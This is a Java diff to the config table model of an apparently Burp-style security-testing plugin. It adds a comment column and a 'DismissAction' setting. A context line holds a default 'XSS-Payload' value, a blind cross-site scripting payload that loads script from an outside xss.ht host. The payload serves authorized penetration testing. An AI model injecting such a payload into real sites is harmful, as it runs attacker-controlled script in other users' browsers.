@@ -16,7 +16,7 @@ public class ConfigTableModel extends AbstractTableModel{
 	private static final long serialVersionUID = 1L;
 	private List<ConfigEntry> configEntries =new ArrayList<ConfigEntry>();
 	private static final String[] titles = new String[] {
-			"Key", "Value", "Type", "Enable"
+			"Key", "Value", "Type", "Enable", "Comment"
 	};
 
 	public ConfigTableModel(){
@@ -26,6 +26,7 @@ public class ConfigTableModel extends AbstractTableModel{
 		configEntries.add(new ConfigEntry("browserPath", "C:\\Program Files\\Mozilla Firefox\\firefox.exe",ConfigEntry.Config_Basic_Variable,true,false));
 		configEntries.add(new ConfigEntry("tokenHeaders", "token,Authorization,Auth,jwt",ConfigEntry.Config_Basic_Variable,true,false));
 		configEntries.add(new ConfigEntry("DismissedHost", "*.firefox.com,*.mozilla.com",ConfigEntry.Config_Basic_Variable,true,false));
+		configEntries.add(new ConfigEntry("DismissAction", "enable = ACTION_DROP; disable = ACTION_DONT_INTERCEPT",ConfigEntry.Config_Basic_Variable,true,false,"enable this config to use ACTION_DROP,disable to use ACTION_DONT_INTERCEPT"));
 		configEntries.add(new ConfigEntry("XSS-Payload", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Config_Basic_Variable,true,false));
 		
 		configEntries.add(new ConfigEntry("SQLMap-Python-Path","",ConfigEntry.Config_Basic_Variable,false,false));
@@ -171,6 +172,8 @@ public class ConfigTableModel extends AbstractTableModel{
 			return entry.getType();
 		case 3:
 			return entry.isEnable();
+		case 4:
+			return entry.getComment();
 		default:
 			return "";
 		}
@@ -202,6 +205,9 @@ public class ConfigTableModel extends AbstractTableModel{
 //				entry.setEnable(false);
 //			}
 			entry.setEnable((boolean)value);
+			break;
+		case 4:
+			entry.setComment((String) value);
 			break;
 		default:
 			break;
